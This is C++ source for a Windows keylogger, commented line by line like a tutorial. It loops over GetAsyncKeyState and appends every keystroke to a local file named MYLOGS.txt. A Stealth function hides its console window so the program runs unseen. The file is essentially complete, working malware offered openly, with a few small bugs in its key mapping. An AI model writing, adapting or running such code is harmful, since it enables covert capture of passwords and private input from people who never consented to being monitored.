// keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
using namespace std;
#include <windows.h>
#include<winuser.h>

int SaveLogs(int key_stroke, const char* file);
void Stealth();  //Declare stealth function to make you keylogger hidden.

int main()
{
    Stealth();       // This will call the stealth function.
    char i;          //Here we declare ‘i’ from the type ‘char’

    while (1)     // Here we say ‘while (1)’ execute the code.
    {
        for (i = 8; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767) {
                char logName[] = "MYLOGS.txt";
                SaveLogs(i, logName);    // This will send the value of ‘i’ and "MYLOGS.txt" to our SaveLogs function.
            } 
        }
    }
    system("PAUSE"); // Here we say that the systems have to wait before exiting.
    return 0;
}

int SaveLogs(int key_stroke, const char* file)   // Here we define our SaveLogs function.
{
    if ((key_stroke == 1) || (key_stroke == 2))
        return 0;

    FILE* OUTPUT_FILE;

    fopen_s(&OUTPUT_FILE,file, "a");

    if (key_stroke == 8)  // The numbers stands for the ascii value of a character
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", "n");
    else if (key_stroke == 32)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, "%s", ".");
    else if (key_stroke == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
    else if (key_stroke == VK_F1)
        fprintf(OUTPUT_FILE, "%s", "[F1]");
    else if (key_stroke == VK_F2)
        fprintf(OUTPUT_FILE, "%s", "[F2]");
    else if (key_stroke == VK_F3)
        fprintf(OUTPUT_FILE, "%s", "[F3]");
    else if (key_stroke == VK_F4)
        fprintf(OUTPUT_FILE, "%s", "[F4]");
    else if (key_stroke == VK_F5)
        fprintf(OUTPUT_FILE, "%s", "[F5]");
    else if (key_stroke == VK_F6)
        fprintf(OUTPUT_FILE, "%s", "[F6]");
    else if (key_stroke == VK_F7)
        fprintf(OUTPUT_FILE, "%s", "[F7]");
    else if (key_stroke == VK_F8)
        fprintf(OUTPUT_FILE, "%s", "[F8]");
    else if (key_stroke == VK_F9)
        fprintf(OUTPUT_FILE, "%s", "[F9]");
    else if (key_stroke == VK_F10)
        fprintf(OUTPUT_FILE, "%s", "[F10]");
    else if (key_stroke == VK_F11)
        fprintf(OUTPUT_FILE, "%s", "[F11]");
    else if (key_stroke == VK_F12)
        fprintf(OUTPUT_FILE, "%s", "[F12]");
    else if (key_stroke == VK_F13)
        fprintf(OUTPUT_FILE, "%s", "[13]");
    else if (key_stroke == VK_F14)
        fprintf(OUTPUT_FILE, "%s", "[F14]");
    else if (key_stroke == VK_F15)
        fprintf(OUTPUT_FILE, "%s", "[F15]");
    else if (key_stroke == VK_F16)
        fprintf(OUTPUT_FILE, "%s", "[F16]");
    else if (key_stroke == VK_F17)
        fprintf(OUTPUT_FILE, "%s", "[F17]");
    else if (key_stroke == VK_F18)
        fprintf(OUTPUT_FILE, "%s", "[F18]");
    else if (key_stroke == VK_F19)
        fprintf(OUTPUT_FILE, "%s", "[F19]");
    else if (key_stroke == VK_F20)
        fprintf(OUTPUT_FILE, "%s", "[F20]");
    else if (key_stroke == VK_F21)
        fprintf(OUTPUT_FILE, "%s", "[F21]");
    else if (key_stroke == VK_F22)
        fprintf(OUTPUT_FILE, "%s", "[F22]");
    else if (key_stroke == VK_F23)
        fprintf(OUTPUT_FILE, "%s", "[F23]");
    else if (key_stroke == VK_F24)
        fprintf(OUTPUT_FILE, "%s", "[F24]");
    else
        fprintf(OUTPUT_FILE, "%s", &key_stroke);

    fclose(OUTPUT_FILE);
    return 0;
}

void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}
